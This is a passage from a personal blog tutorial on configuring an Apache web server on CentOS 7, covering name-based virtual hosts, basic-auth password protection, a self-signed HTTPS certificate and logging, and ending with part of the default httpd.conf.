</span><span class='line'>#   Value: yes|no,  default: no
</span><span class='line'># Saves all firewall rules to /etc/sysconfig/iptables if firewall gets
</span><span class='line'># restarted.
</span><span class='line'>IPTABLES_SAVE_ON_RESTART="yes"</span></code></pre></td></tr></table></div></figure>


<p>Finally, I was able to save the changes and checked that they persisted after reboot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>service iptables save
</span><span class='line'>iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]</span></code></pre></td></tr></table></div></figure>


<h4>Name-based vhosts</h4>

<p>We&rsquo;ve seen the virtual hosts running on different ports, now let&rsquo;s see how we can <strong>serve them on the same port, but with different names</strong>. I modified one of the config files so that both sites will run on port 80.Let&rsquo;s see the current virtual host settings:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>httpd -S
</span><span class='line'>VirtualHost configuration:
</span><span class='line'>*:80                   is a NameVirtualHost
</span><span class='line'>         default server myweb.local (/etc/httpd/conf.d/myweb.conf:1)
</span><span class='line'>         port 80 namevhost myweb.local (/etc/httpd/conf.d/myweb.conf:1)
</span><span class='line'>         port 80 namevhost skynet.local (/etc/httpd/conf.d/skynet.conf:1)
</span><span class='line'>ServerRoot: "/etc/httpd"
</span><span class='line'>Main DocumentRoot: "/var/www/html"
</span><span class='line'>Main ErrorLog: "/etc/httpd/logs/error_log"
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>We will use the server names to navigate to those sites. Because I am testing locally with no DNS, I modified <code>/etc/hosts</code> and added these entries:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.80.153 myweb.local
</span><span class='line'>192.168.80.153 skynet.local</span></code></pre></td></tr></table></div></figure>


<p>Now I was able to use the names of the sites in the web browser.</p>

<h3>Password protection</h3>

<p>It&rsquo;s time to restrict access to the skynet website! There are a number of ways that Apache can protect a resource with a password and ensure that is accessible only to certain users. In this example, I will want the skynet website to allow only a user called tx. First, I used the <em>htpasswd</em> utility to create a <em>.htpasswd</em> file (you can call it whatever you want), and placed it in <code>/etc/httpd</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>htpasswd -c /etc/httpd/.htpasswd tx
</span><span class='line'>New password: 
</span><span class='line'>Re-type new password: 
</span><span class='line'>Adding password for user tx</span></code></pre></td></tr></table></div></figure>


<p>This file holds the allowed user/password combination:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/httpd/.htpasswd
</span><span class='line'>tx:$apr1$2FI77JZQ$IrMFnxvHzvtRhWGiQfvxL0</span></code></pre></td></tr></table></div></figure>


<p>The next step is to tell Apache to restrict access to a resource based on this file. If you have access to the main configuration file or the virtual host config file, the preferred way is to add a Directory directive there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nano /etc/httpd/conf.d/skynet.conf
</span><span class='line'>&lt;VirtualHost *:80&gt;
</span><span class='line'>    DocumentRoot "/var/www/html/skynet"
</span><span class='line'>    ServerName skynet.local
</span><span class='line'>    &lt;Directory "/var/www/html/skynet"&gt;
</span><span class='line'>        AuthType Basic
</span><span class='line'>        AuthName "Authorized Only"
</span><span class='line'>        AuthUserFile /etc/httpd/.htpasswd
</span><span class='line'>        Require valid-user
</span><span class='line'>    &lt;/Directory&gt;
</span><span class='line'>&lt;/VirtualHost&gt;
</span></code></pre></td></tr></table></div></figure>


<p>The Directory specified is the one that will be password-protected. Next, we specify the type of authentication (basic in this case, so no super sensitive files should be stored there), the name which will be displayed on the prompt, the location where Apache can find the password file, and the allowed user(s). Maybe we&rsquo;ll want to add some terminators later, so instead of just specifying one user, I allowed any valid user/password combination from the password file.</p>

<p>Now if you try to go to the skynet website, you will see the window prompting for username and password.</p>

<p>Another way you can restrict directory access is via a <strong>.htaccess</strong> file. Due to performance and security reasons, you should avoid this, if possible.</p>

<p>First, create a .htaccess file in the directory you want to protect:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nano /var/www/html/skynet/.htaccess
</span><span class='line'>AuthType Basic
</span><span class='line'>AuthName "Authorized Only"
</span><span class='line'>AuthUserFile /etc/httpd/.htpasswd
</span><span class='line'>Require valid-user</span></code></pre></td></tr></table></div></figure>


<p>For the .htaccess file to work, you need to edit the <code>/etc/httpd/conf/httpd.conf</code> file, and change the <a href="https://httpd.apache.org/docs/current/mod/core.html#allowoverride">AllowOverride directive</a> inside Directory. When set to None, as it is by default, .htaccess files are ignored. Change it to AuthConfig (I had to do it both under /var/www and /var/www/html).</p>

<h3>HTTPS with self-signed certificate</h3>

<p>In the next demo, I will encrypt the skynet website with SSL (removed all the authorization bits for demo purposes).</p>

<p>First, I installed <a href="https://httpd.apache.org/docs/current/mod/mod_ssl.html">mod_ssl</a> with <code>yum install mod_ssl</code>. Next, I created a directory for Apache to store its server key and certificate: <code>mkdir /etc/httpd/myssl</code></p>

<p>Inside this directory, I created a RSA private key of length 2048:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat myssl]# openssl genrsa -out https.key 2048
</span><span class='line'>Generating RSA private key, 2048 bit long modulus
</span><span class='line'>....................+++
</span><span class='line'>..............+++
</span><span class='line'>e is 65537 (0x10001)</span></code></pre></td></tr></table></div></figure>


<p>Then I created a Certificate Signing Request (CSR):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat myssl]# openssl req -new -key https.key -out server.csr
</span><span class='line'>You are about to be asked to enter information that will be incorporated
</span><span class='line'>into your certificate request.
</span><span class='line'>What you are about to enter is what is called a Distinguished Name or a DN.
</span><span class='line'>There are quite a few fields but you can leave some blank
</span><span class='line'>For some fields there will be a default value,
</span><span class='line'>If you enter '.', the field will be left blank.
</span><span class='line'>-----
</span><span class='line'>Country Name (2 letter code) [XX]:
</span><span class='line'>State or Province Name (full name) []:
</span><span class='line'>Locality Name (eg, city) [Default City]:
</span><span class='line'>Organization Name (eg, company) [Default Company Ltd]:
</span><span class='line'>Organizational Unit Name (eg, section) []:
</span><span class='line'>Common Name (eg, your name or your server's hostname) []:
</span><span class='line'>Email Address []:
</span><span class='line'>
</span><span class='line'>Please enter the following 'extra' attributes
</span><span class='line'>to be sent with your certificate request
</span><span class='line'>A challenge password []:
</span><span class='line'>An optional company name []:</span></code></pre></td></tr></table></div></figure>


<p>Lastly, I generated an x509 certificate with a duration of an year:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat myssl]# openssl x509 -req -days 365 -in server.csr -signkey https.key -out mycert.crt
</span><span class='line'>Signature ok
</span><span class='line'>subject=/C=XX/L=Default City/O=Default Company Ltd
</span><span class='line'>Getting Private key</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re not done yet. Edit the file <code>/etc/httpd/conf.d/ssl.conf</code>, and comment the lines with the location of the server key and certificate, replacing them with new ones pointing at our previously created files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#SSLCertificateFile /etc/pki/tls/certs/localhost.crt
</span><span class='line'>SSLCertificateFile /etc/httpd/myssl/mycert.crt
</span><span class='line'>#SSLCertificateKeyFile /etc/pki/tls/private/localhost.key
</span><span class='line'>SSLCertificateKeyFile /etc/httpd/myssl/https.key</span></code></pre></td></tr></table></div></figure>


<p>Now restart the server and go to website (mine is at <a href="https://192.168.80.153/">https://192.168.80.153/</a> ). Your browser will warn you about the untrusted connection, add it to exceptions and now you have https on your site.</p>

<h3>Logging</h3>

<p>Lastly, let&rsquo;s go over Apache&rsquo;s logging system. There are 2 types of logs kept, error logs for when some error happens, and access logs, that provide information about incoming requests. By default, these logs are located at <code>/var/log/httpd/error_log</code> and <code>/var/log/httpd/access_log</code> on CentOS</p>

<p>For your sites, you can configure the logs and choose where to store them. I decided to separate the logs for my skynet website. I made a folder for them in /var/log/httpd/skynet-logs, and modified the skynet virtual host config file and added the path and format for the logs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>CustomLog /var/log/httpd/skynet-logs/skynet-access.log combined
</span><span class='line'>ErrorLog /var/log/httpd/skynet-logs/skynet-error.log</span></code></pre></td></tr></table></div></figure>


<p>I wanted the combined format instead of the common one, because it provides a bit more information, including also the User-agent and the Referer</p>

<p>Hopefully, this post has helped others in setting up an Apache web server. Since I&rsquo;ve installed it on CentOS 7, I also had to account for SELinux and some other differences from a Debian distro, so it&rsquo;s been a good learning experience.</p>

<p>If you want to become an Apache wizard, the <a href="https://httpd.apache.org/docs/2.4/">Apache 2.4 documentation</a> should be a good starting point.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>________________________________________
</span><span class='line'>/ Give thought to your reputation.       \
</span><span class='line'>| Consider changing name and moving to a |
</span><span class='line'>\ new town.                              /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>


<p><strong>Freshly installed httpd.conf file</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#
</span><span class='line'># This is the main Apache HTTP server configuration file.  It contains the
</span><span class='line'># configuration directives that give the server its instructions.
</span><span class='line'># See &lt;URL:http://httpd.apache.org/docs/2.4/&gt; for detailed information.
</span><span class='line'># In particular, see 
</span><span class='line'># &lt;URL:http://httpd.apache.org/docs/2.4/mod/directives.html&gt;
</span><span class='line'># for a discussion of each configuration directive.
</span><span class='line'>#
</span><span class='line'># Do NOT simply read the instructions in here without understanding
</span><span class='line'># what they do.  They're here only as hints or reminders.  If you are unsure
</span><span class='line'># consult the online docs. You have been warned.  
</span><span class='line'>#
</span><span class='line'># Configuration and logfile names: If the filenames you specify for many
</span><span class='line'># of the server's control files begin with "/" (or "drive:/" for Win32), the
</span><span class='line'># server will use that explicit path.  If the filenames do *not* begin
</span><span class='line'># with "/", the value of ServerRoot is prepended -- so 'log/access_log'
</span><span class='line'># with ServerRoot set to '/www' will be interpreted by the
</span><span class='line'># server as '/www/log/access_log', where as '/log/access_log' will be
</span><span class='line'># interpreted as '/log/access_log'.
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># ServerRoot: The top of the directory tree under which the server's
</span><span class='line'># configuration, error, and log files are kept.
</span><span class='line'>#
</span><span class='line'># Do not add a slash at the end of the directory path.  If you point
</span><span class='line'># ServerRoot at a non-local disk, be sure to specify a local disk on the
</span><span class='line'># Mutex directive, if file-based mutexes are used.  If you wish to share the
</span><span class='line'># same ServerRoot for multiple httpd daemons, you will need to change at
</span><span class='line'># least PidFile.
</span><span class='line'>#
</span><span class='line'>ServerRoot "/etc/httpd"
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Listen: Allows you to bind Apache to specific IP addresses and/or
</span><span class='line'># ports, instead of the default. See also the &lt;VirtualHost&gt;
</span><span class='line'># directive.
</span><span class='line'>#
</span><span class='line'># Change this to Listen on specific IP addresses as shown below to 
</span><span class='line'># prevent Apache from glomming onto all bound IP addresses.
</span><span class='line'>#
</span><span class='line'>#Listen 12.34.56.78:80
</span><span class='line'>Listen 80
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Dynamic Shared Object (DSO) Support
</span><span class='line'>#
</span><span class='line'># To be able to use the functionality of a module which was built as a DSO you
</span><span class='line'># have to place corresponding `LoadModule' lines at this location so the
</span><span class='line'># directives contained in it are actually available _before_ they are used.
</span><span class='line'># Statically compiled modules (those listed by `httpd -l') do not need
</span><span class='line'># to be loaded here.
</span><span class='line'>#
</span><span class='line'># Example:
</span><span class='line'># LoadModule foo_module modules/mod_foo.so
</span><span class='line'>#
</span><span class='line'>Include conf.modules.d/*.conf
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># If you wish httpd to run as a different user or group, you must run
</span><span class='line'># httpd as root initially and it will switch.  
</span><span class='line'>#
</span><span class='line'># User/Group: The name (or #number) of the user/group to run httpd as.
</span><span class='line'># It is usually good practice to create a dedicated user and group for
</span><span class='line'># running httpd, as with most system services.
</span><span class='line'>#
</span><span class='line'>User apache
</span><span class='line'>Group apache
</span><span class='line'>
</span><span class='line'># 'Main' server configuration
</span><span class='line'>#
</span><span class='line'># The directives in this section set up the values used by the 'main'
</span><span class='line'># server, which responds to any requests that aren't handled by a
</span><span class='line'># &lt;VirtualHost&gt; definition.  These values also provide defaults for
</span><span class='line'># any &lt;VirtualHost&gt; containers you may define later in the file.
</span><span class='line'>#
</span><span class='line'># All of these directives may appear inside &lt;VirtualHost&gt; containers,
</span><span class='line'># in which case these default settings will be overridden for the
</span><span class='line'># virtual host being defined.
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># ServerAdmin: Your address, where problems with the server should be
</span><span class='line'># e-mailed.  This address appears on some server-generated pages, such
</span><span class='line'># as error documents.  e.g. admin@your-domain.com
</span><span class='line'>#
</span><span class='line'>ServerAdmin root@localhost
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># ServerName gives the name and port that the server uses to identify itself.
</span><span class='line'># This can often be determined automatically, but we recommend you specify
</span><span class='line'># it explicitly to prevent problems during startup.
</span><span class='line'>#
</span><span class='line'># If your host doesn't have a registered DNS name, enter its IP address here.
</span><span class='line'>#
</span><span class='line'>#ServerName www.example.com:80
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Deny access to the entirety of your server's filesystem. You must
</span><span class='line'># explicitly permit access to web content directories in other 
</span><span class='line'># &lt;Directory&gt; blocks below.
</span><span class='line'>#
</span><span class='line'>&lt;Directory /&gt;
</span><span class='line'>    AllowOverride none
</span><span class='line'>    Require all denied
</span><span class='line'>&lt;/Directory&gt;
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Note that from this point forward you must specifically allow
</span><span class='line'># particular features to be enabled - so if something's not working as
</span><span class='line'># you might expect, make sure that you have specifically enabled it
</span><span class='line'># below.
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># DocumentRoot: The directory out of which you will serve your
</span><span class='line'># documents. By default, all requests are taken from this directory, but
</span><span class='line'># symbolic links and aliases may be used to point to other locations.
</span><span class='line'>#
</span><span class='line'>DocumentRoot "/var/www/html"
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Relax access to content within /var/www.
</span><span class='line'>#
</span><span class='line'>&lt;Directory "/var/www"&gt;
</span><span class='line'>    AllowOverride None
</span><span class='line'>    # Allow open access:
</span><span class='line'>    Require all granted
</span><span class='line'>&lt;/Directory&gt;
</span><span class='line'>
</span><span class='line'># Further relax access to the default document root:
</span><span class='line'>&lt;Directory "/var/www/html"&gt;
</span><span class='line'>    #
</span><span class='line'>    # Possible values for the Options directive are "None", "All",
</span><span class='line'>    # or any combination of:
</span><span class='line'>    #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews
</span><span class='line'>    #
</span><span class='line'>    # Note that "MultiViews" must be named *explicitly* --- "Options All"
</span><span class='line'>    # doesn't give it to you.
</span><span class='line'>    #
</span><span class='line'>    # The Options directive is both complicated and important.  Please see
</span><span class='line'>    # http://httpd.apache.org/docs/2.4/mod/core.html#options
</span><span class='line'>    # for more information.
</span><span class='line'>    #
</span><span class='line'>    Options Indexes FollowSymLinks
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # AllowOverride controls what directives may be placed in .htaccess files.
</span><span class='line'>    # It can be "All", "None", or any combination of the keywords:
</span><span class='line'>    #   Options FileInfo AuthConfig Limit
</span><span class='line'>    #
</span><span class='line'>    AllowOverride None
</span><span class='line'>
</span><span class='line'>    #
</span><span class='line'>    # Controls who can get stuff from this server.
</span><span class='line'>    #
</span><span class='line'>    Require all granted
</span><span class='line'>&lt;/Directory&gt;
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># DirectoryIndex: sets the file that Apache will serve if a directory
</span><span class='line'># is requested.
</span><span class='line'>#
</span><span class='line'>&lt;IfModule dir_module&gt;
</span><span class='line'>    DirectoryIndex index.html
</span><span class='line'>&lt;/IfModule&gt;
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># The following lines prevent .htaccess and .htpasswd files from being 
</span><span class='line'># viewed by Web clients. 
</span><span class='line'>#
</span><span class='line'>&lt;Files ".ht*"&gt;
</span><span class='line'>    Require all denied
</span><span class='line'>&lt;/Files&gt;
</span><span class='line'>
</span><span class='line'>#
